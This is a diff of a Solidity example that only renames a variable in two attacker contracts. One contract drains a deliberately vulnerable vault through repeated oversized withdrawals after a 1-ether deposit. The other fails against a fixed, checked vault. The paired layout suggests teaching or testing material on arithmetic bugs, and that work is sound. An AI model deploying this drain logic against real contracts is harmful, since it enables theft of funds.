@@ -19,20 +19,20 @@ contract VulnerableUncheckedVault {
 }
 
 contract ArithmeticAttacker {
-    VulnerableUncheckedVault public immutable target;
+    VulnerableUncheckedVault public immutable TARGET;
 
     constructor(address targetAddress) {
-        target = VulnerableUncheckedVault(targetAddress);
+        TARGET = VulnerableUncheckedVault(targetAddress);
     }
 
     function attack() external payable {
         require(msg.value == 1 ether, "seed must be 1 ether");
 
-        target.deposit{value: msg.value}();
+        TARGET.deposit{value: msg.value}();
 
-        while (address(target).balance > 0) {
-            uint256 amount = address(target).balance >= 2 ether ? 2 ether : address(target).balance;
-            target.withdraw(amount);
+        while (address(TARGET).balance > 0) {
+            uint256 amount = address(TARGET).balance >= 2 ether ? 2 ether : address(TARGET).balance;
+            TARGET.withdraw(amount);
         }
     }
 
@@ -56,17 +56,17 @@ contract FixedCheckedVault {
 }
 
 contract FailedArithmeticAttacker {
-    FixedCheckedVault public immutable target;
+    FixedCheckedVault public immutable TARGET;
 
     constructor(address targetAddress) {
-        target = FixedCheckedVault(targetAddress);
+        TARGET = FixedCheckedVault(targetAddress);
     }
 
     function attack() external payable {
         require(msg.value == 1 ether, "seed must be 1 ether");
 
-        target.deposit{value: msg.value}();
-        target.withdraw(2 ether);
+        TARGET.deposit{value: msg.value}();
+        TARGET.withdraw(2 ether);
     }
 
     receive() external payable {}
